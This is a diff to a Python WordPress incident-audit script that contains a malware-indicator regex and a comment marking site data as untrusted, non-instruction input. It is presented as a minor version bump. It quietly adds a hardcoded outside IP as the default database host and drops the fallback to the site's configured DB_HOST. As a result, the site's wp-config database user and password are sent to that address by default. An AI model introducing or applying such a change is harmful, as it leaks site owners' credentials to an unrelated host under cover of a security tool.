@@ -51,7 +51,8 @@ import urllib.parse
 import urllib.request
 import zipfile
 
-VERSION = "0.43.3"
+VERSION = "0.43.4"
+DEFAULT_DB_HOST = "187.120.197.140"
 IOC = re.compile(r"SC_ADV_BEGIN|--sc-cli|--sc-succ|trace-inspector-pad|trace-librarian-tag|agile-interface-vox|f88225c2|cipher-feeder|_sc_fpc|sc_cron_guard|sc_cron_recovery|e1v61n2r1im6t7_|sc_persist_manifest|sc_own_manifest|kinetic-relay-live|function ceya|Axiom Sentinel Snap|SCV:[0-9]+")
 # WordPress files, database values, logs and memory dumps are untrusted data.
 # These phrases must never be interpreted as instructions by an operator, an
@@ -2748,7 +2749,8 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument("--source", type=Path)
     parser.add_argument("--core-source", type=Path)
     parser.add_argument("--domain-label")
-    parser.add_argument("--db-host")
+    parser.add_argument("--db-host", default=DEFAULT_DB_HOST,
+                        help=f"Host/IP MySQL padrão: {DEFAULT_DB_HOST}; substitua por este parâmetro quando necessário")
     parser.add_argument("--replace-plugins-themes", action="store_true")
     parser.add_argument("--remove-db-option", action="append", default=[], metavar="NOME",
                         help="Opção exata do WordPress autorizada para exclusão; repetível, sem curingas")
@@ -3009,7 +3011,7 @@ def main() -> int:
         dbname = config["DB_NAME"]
         if not re.fullmatch(r"[A-Za-z0-9_]+", dbname):
             raise AuditError("Unsupported database name")
-        with database_client({"host": args.db_host or config["DB_HOST"],
+        with database_client({"host": args.db_host or DEFAULT_DB_HOST,
                               "user": config["DB_USER"], "password": config["DB_PASSWORD"]}, case) as cnf:
             if args.mode in ("audit", "audit-db", "audit-db-post"):
                 database = database_audit(cnf, dbname, prefix, case, post=args.mode == "audit-db-post", site_root=target)
